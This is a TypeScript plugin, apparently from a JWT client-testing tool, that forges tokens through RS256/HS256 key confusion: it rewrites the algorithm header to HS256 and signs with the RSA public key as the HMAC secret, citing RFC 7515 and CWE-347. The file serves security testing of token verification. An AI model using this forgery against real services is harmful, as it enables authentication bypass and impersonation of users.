/**
 * RS256/HS256 Key Confusion Attack
 *
 * Changes the algorithm from RS256 to HS256 and signs the token
 * using the RSA public key as an HMAC secret.
 *
 * If a client uses the public key for both signature types without
 * checking the algorithm, it will accept the forged token.
 *
 * Spec: RFC 7515 Section 4.1.1 - Algorithm must match key type
 * CWE-347: Improper Verification of Cryptographic Signature
 */

import type { MischiefPlugin } from "../types.js";

export const keyConfusionPlugin: MischiefPlugin = {
	id: "key-confusion",
	name: "RS256/HS256 Key Confusion",
	severity: "critical",
	phase: "token-signing",

	spec: {
		rfc: "RFC 7515 Section 4.1.1",
		cwe: "CWE-347",
		description: "Clients MUST verify the algorithm matches the expected key type",
	},

	description: "Signs RS256 token with HS256 using public key as HMAC secret",

	async apply(ctx) {
		if (!ctx.token) {
			return { applied: false, mutation: "No token context", evidence: {} };
		}

		const originalAlg = ctx.token.header.alg;

		// Only apply to RSA-signed tokens
		if (!originalAlg.startsWith("RS") && !originalAlg.startsWith("PS")) {
			return {
				applied: false,
				mutation: `Token uses ${originalAlg}, not an RSA algorithm`,
				evidence: { originalAlg },
			};
		}

		const publicKey = await ctx.token.getPublicKey();
		ctx.token.header.alg = "HS256";
		await ctx.token.sign("HS256", publicKey);

		return {
			applied: true,
			mutation: `Changed from ${originalAlg} to HS256, signed with public key as HMAC secret`,
			evidence: {
				originalAlg,
				newAlg: "HS256",
				keySource: "public-key-as-secret",
			},
		};
	},
};
